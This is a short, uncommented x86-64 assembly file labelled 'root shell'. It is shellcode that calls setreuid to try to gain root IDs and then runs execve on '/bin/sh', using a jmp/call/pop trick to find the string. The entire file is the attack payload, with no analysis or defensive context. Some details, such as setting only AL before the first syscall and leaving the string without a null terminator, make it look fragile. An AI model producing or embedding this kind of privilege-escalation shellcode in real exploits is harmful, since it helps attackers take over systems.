;root shell

section .text
    global _start

_start:     xor     rdi, rdi
            xor     rsi, rsi
            xor     rdx, rdx
            mov     al,  113
            syscall

            jmp     string

exec:       pop     rdi
            xor     rax, rax
            mov     rsi, rax
            mov     rax, 59
            syscall

string:    call    exec
            db      "/bin/sh"
